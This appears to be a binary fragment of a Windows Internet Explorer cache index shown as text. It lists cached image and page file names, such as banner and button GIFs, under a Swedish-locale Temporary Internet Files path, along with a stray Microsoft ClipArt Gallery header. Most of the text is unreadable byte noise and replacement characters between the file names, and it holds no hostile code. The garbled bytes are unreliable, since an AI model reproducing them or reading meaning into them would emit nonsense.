   bg1[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �w@       @                      �kD]���C�����y}[ }�6�:�                                                                        
�:b�wD~�ٝz�͛m �_a�                                                                           pushpanel-up0[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �L@                              �l5BSA���[R�t� >
   pil[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �r@                              2AvWe����d�3�q�3=� m�'ר�                                                                           1163[1].png    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ؑ@      ,@                      ���9�F� ��[G~�� o��yR�                                                                           house_square[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     `h@      (@                      ���p�Y-2�����[� *:E�                                                                           pratbubblastor_top[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@      0@                      �ܗp)8d��� ��]�G�٦ ܽ{;�                                                                            freeinternet-BIGBOTTOM_01[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@      @                      S�j=׽�L��7�W׷�n� ��G�;�                                                                           dish_interior_r6_c6[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     J�@                              ����.f���
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            �L �'y�;�                                                                           sid6[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     @v@       @                      �Gh���kX(<2��\ѽ ��CE�                                                                           choose_country2[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@                              �K�`��k}F�TV��a��~� �A���                                                                           tab_g_05[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    ���@      @                      (:JWH��X��g�A2 FPT�<�                                                                           scape_update[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ҭ@      �?                      �ם
��8m{{* ���%=�                                                                        
�S@�                                                                           banner1[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     6�@                              ѪSl�U�}�W��;���� �
�S@�                                                                           banner3[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     p�@      �?                      V�K@�R%fQ�